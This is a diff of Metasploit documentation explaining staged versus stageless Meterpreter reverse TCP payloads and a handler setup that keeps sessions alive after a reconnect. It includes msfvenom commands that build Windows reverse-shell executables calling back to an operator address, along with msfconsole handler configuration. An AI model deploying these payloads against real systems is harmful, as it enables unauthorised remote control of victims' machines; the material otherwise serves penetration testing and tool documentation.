@@ -37,15 +37,15 @@ You'll notice that the stager is quite dumb and blind, and makes a bunch of assu
 
 As a result of these assumptions, Metasploit also has to assume that the inbound connection is staged, and send the correct bytes in order when a new connection comes in. This means that the handler will, in unison with the stager, do the following:
 
-* Listen on a given interface:port.
+* Listen on a given address:port.
 * Receive a new connection.
-* Generate a payload based on the configuration (in this case it's the first stage of a Meterpreter payload, and comes in the form of a dynamically patched `metsrv` DLL followed by a configuration block).
+* Generate a payload (in this case it's the first stage of Meterpreter, and comes in the form of a dynamically patched `metsrv` DLL followed by a configuration block).
 * Send a 4-byte block that represents the size of the incoming payload.
-* Send the rest of the payload to the target (this is where you'll see `Sending stage (XXX bytes) to YYY`).
-* Wait for the payload to be executed, then continue on with establishing a valid Meterpreter session, which involves:
+* Send the payload to the target (this is where you'll see `Sending stage (XXX bytes) to YYY`).
+* Wait for the payload to be executed and for the host to reach back out to Metasploit, then continue on with establishing a valid Meterpreter session, which involves:
     * Negotiating SSL on the existing socket.
     * Querying for basic system information.
-    * Asking the target what Meterpreter commands it currently supports (which allows for checks to see which extensions are loaded).
+    * Asking the target which Meterpreter commands it currently supports (which allows for checks to see which extensions are loaded).
     * Loading `stdapi` if it isn't present.
     * Loading `priv` if it isn't present.
     * Doing some other local accounting to track the new session.
@@ -54,7 +54,7 @@ So the process here is rather involved, but thankfully completely opaque to the 
 
 ## Stageless payloads.
 
-Stageless payloads still seem to be relatively unknown by most Metasploit users, partly because they aren't talked about much, partly because of documentation, and partly because they're easily hidden. The equivalent of the above staged payload in the stageless world is `windows/meterpreter_reverse_tcp` (note the use of `_` instead of the second `/` in the payload name). The key differences here are:
+Stageless payloads still seem to be relatively unknown by most Metasploit users, partly because they aren't talked about much, partly because of documentation, and partly because they're easily hidden. The staged equivalent of the above staged payload (`windows/meterpreter/reverse_tcp`) is `windows/meterpreter_reverse_tcp`. Note the use of `_` instead of the second `/` in the payload name. The key differences here are:
 
 * There is no "dumb" stager required.
 * The payload includes "all that is required to get a session running", which in this case is a copy of the `metsrv` DLL.
@@ -64,12 +64,12 @@ The big ticket item here is that no communications are made without encryption. 
 
 So to recap, when a stageless payload is fired, the following happens:
 
-* `metsrv` is invoked immediately with a pointer to the configuration block that is also baked into the payload.
+* `metsrv` is invoked immediately with a pointer to the configuration block that was baked into the payload.
+* Any extensions that were added at payload generation time (via the `EXTENSIONS` parameter) are loaded in, again using [Reflective DLL Injection][].
 * The configuration block doesn't include an active socket handle, and so `metsrv` looks at the configuration to determine where it should connect to.
-* Any extensions that were added a payload generation time (via the `EXTENSIONS` parameter) are loaded in, again using [Reflective DLL Injection][].
 * It creates a new TCP connection and calls Metasploit on the given address:port.
 * The socket is  _immediately_ wrapped in SSL.
-* It is then able to talk via TLV packet comms with Metasploit over an encrypted transport to finish setting up the session.
+* It is then able to talk via TLV packets with Metasploit over an encrypted transport to finish setting up the session.
 
 On the Metasploit side, things are a little different as well:
 
@@ -128,14 +128,13 @@ I'd like to state for the record that even if reconnection did function without 
 
 Last year, the notion of a _configuration block_ was added to Metasploit and Meterpreter. This configuration block (documented on the [wiki][config-wiki]), contains a bunch of stuff including transport configuration details. When a staged payload fires, the generated payload contains the configuration block that matches the configuration of the handler.
 
-Therefore, in the case of TCP, it contains both the `LHOST` and `LPORT` settings that are **currently active in the handler**. This is _not_ the same as the `LHOST` and `LPORT` settings that were used when the staged payload was generated using `msfvenom`.
+Therefore, in the case of TCP, it contains both the `LHOST` and `LPORT` settings that are **currently active in the handler**. These settings are _not necessarily the same_ as the `LHOST` and `LPORT` settings that were used when the staged payload was generated using `msfvenom`.
 
 This means that, during the staging process, we have the ability to give a different configuration to Meterpreter than we gave the stager during payload generation time. There's a window of opportunity here! Instead of passing in the same configuration as the current staged listener, we can instead pass in transport details that point to the _stageless_ version. This means the current transport configuration would point to the stageless listener even though the active socket is talking to the staged listener.
 
-When communication drops for any of the above reasons, Meterpreter will look at this transport configuration when it attempts to reconnect, and thus will direct itself at the _stageless_ listener instead. Glorious! So how do we do this? It's very simple:
+When communication drops for any of the above reasons, Meterpreter will look at this transport configuration when it attempts to reconnect, and thus will direct itself at the _stageless_ listener instead. Glorious! So how do we do this? It's very simple.
 
-
-We begin by creating a stageless listener
+We begin by creating a stageless listener:
 ```
 msf exploit(handler) > set payload windows/meterpreter_reverse_tcp
 payload => windows/meterpreter_reverse_tcp
@@ -184,7 +183,7 @@ $ msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.1.10.35 LPORT=8000 -f exe
 Next we create a staged listener, but we do the following:
 
 1. We leave `LPORT` set to `8000`, because this is what we want the transport configuration to contain.
-1. We set `ReverseListenerBindPort` to something different (`9000` in our example), as this forces the listener to bind to another port which we will point our staged payload at.
+1. We set `ReverseListenerBindPort` to something different (`9000` in our example), as this forces the listener to bind to another port, which we will point our staged payload at.
 
 ```
 msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
@@ -221,7 +220,7 @@ msf exploit(handler) > run -j
 [*] [2016.10.05-12:29:48] Started reverse TCP handler on 10.1.10.35:9000
 msf exploit(handler) > [*] [2016.10.05-12:29:48] Starting the payload handler...
 ```
-This time, when we create a payload for this listener, we use the `ReverseListenerBindPort` value for `LHOST`:
+This time, when we create a payload for this listener, we use the `ReverseListenerBindPort` value for `LPORT`:
 ```
 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.1.10.35 LPORT=9000 -f exe -o /tmp/staged9000.exe
 ```
@@ -231,7 +230,7 @@ To recap, we now have:
 * A staged payload that will connect to Metasploit on port `9000`.
 * A staged listener listening on port `9000`, but configured to generate a payload that contains a configuration block that references port `8000` instead.
 
-When the payload runs, it will connect to Metasploit on port `9000`. If it needs to _reconnect_ for any reason, it will use port `8000` instead, resulting in a call back to our stageless handler. Here's an example:
+When the staged payload runs, it will connect to Metasploit on port `9000`. If the session needs to _reconnect_ for any reason, Meterpreter will be responsible for that reconnection. Therefore, the configuration block will be referenced instead of the stager configuration, and it will use port `8000` where the stageless listener is active. Here's an example:
 ```
 msf exploit(handler) >
 [*] [2016.10.05-12:34:27] Sending stage (957999 bytes) to 10.1.10.44
@@ -366,7 +365,7 @@ The session comes back and Metasploit knows it's not a new stageless payload (so
 
 ## A cross-architecture migration issue
 
-Unfortunately there is still a case where things can break, and it's all thanks to migration. When migrating, we know that we can cross architectures. That is, we can migrate from an x86 process to an x64 process, and vice versa. Once migrated, the running architecture of the session changes as well, **but the active transport does not know**. As a result if the session has to reconnect for any reason, we end up in a world of hurt.
+Unfortunately there is still a case where things can break, and it's all thanks to migration. When migrating, we know that we can cross architectures. That is, we can migrate from an x86 process to an x64 process, and vice versa. Once migrated, the running architecture of the session changes as well, **but the active transport is not aware of the change**. As a result if the session has to reconnect for any reason, we end up in a world of hurt.
 
 This pain is caused by the fact that Metasploit isn't currently validating the architecture of a session when it connects back on stageless listeners. Instead, it is assumed. This means that Metasploit might think that a session is still x86 when in fact it's x64. We don't have a fix for this issue at the moment, so the best thing to do in the short term is have another listener set up that can handle another architecture, and then add a new transport once the session has been migrated.
 
